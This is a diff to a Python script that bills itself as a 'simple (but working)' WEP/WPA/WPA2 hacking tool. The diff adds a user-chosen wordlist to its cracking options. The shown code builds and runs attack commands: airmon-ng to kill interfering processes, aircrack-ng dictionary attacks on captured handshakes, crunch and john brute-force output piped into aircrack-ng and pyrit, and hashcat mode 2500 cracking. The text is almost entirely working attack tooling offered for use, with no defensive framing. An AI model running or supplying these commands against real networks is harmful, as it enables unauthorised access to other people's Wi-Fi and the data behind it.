@@ -10,6 +10,7 @@ from termcolor import colored
 def killctrl():
 	os.system("airmon-ng check kill")
 
+wlist = "wordlist.lst"
 print "\n+===========================================================================+"
 print "| DWH - Simple (but working) WEP/WPA/WPA2 Hacking script                    |"
 print "| Author: D35m0nd142, https://twitter.com/d35m0nd142                        |"
@@ -69,8 +70,12 @@ if(enc == "WPA" or enc == "WPA2" or enc == "wpa" or enc == "wpa2"):
 	print "  6) Hashcat"
 	choice = raw_input("\n  -> ")
 
+        wlist = ""
+	if(choice == "1" or choice == "5" or choice == "6"):
+		wlist = raw_input("[*] Enter your wordlist -> ") 
+
 	if(choice == "1"):
-		cmd = "aircrack-ng capture_file-01.cap -w ./wordlist.lst"
+		cmd = "aircrack-ng capture_file-01.cap -w ./%s" %wlist
 	elif(choice == "2"):
 		cmd = "crunch 8 20 abcdefghilmnopqrstuvwyxzkjABCDEFGHILMNOPQRSTUWYXZJ0123456789 | aircrack-ng -b %s capture_file-01.cap -w - -e %s" %(bssid, ssid)
 	elif(choice == "3"):
@@ -78,14 +83,13 @@ if(enc == "WPA" or enc == "WPA2" or enc == "wpa" or enc == "wpa2"):
 	elif(choice == "4"):
 		cmd = "john --incremental=all --stdout | pyrit -r capture_file-01.cap -b %s -i - attack_passthrough" %(bssid)
 	elif(choice == "5"):
-		cmd = "john --stdout --wordlist=wordlist.lst | aircrack-ng -b %s -e %s -w - capture_file-01.cap" %(bssid, ssid)
+		cmd = "john --stdout --wordlist=%s | aircrack-ng -b %s -e %s -w - capture_file-01.cap" %(wlist,bssid, ssid)
 	else:
 		os.system("aircrack-ng capture_file-01.cap -J hcfile")
 		print colored("[WARNING] Hashcat module provides 3 different attacks. Stop the current one by yourself in case the previous one has been successfull.","red")
 		time.sleep(2)
 		print "[*] Using Hashcat Dictionary attack..."
 		time.sleep(1)
-		wlist = raw_input("[*] Enter your wordlist -> ") 
 		cmd = "hashcat -m 2500 hcfile.hccap %s" %wlist
 		os.system(cmd)  
 		time.sleep(1)
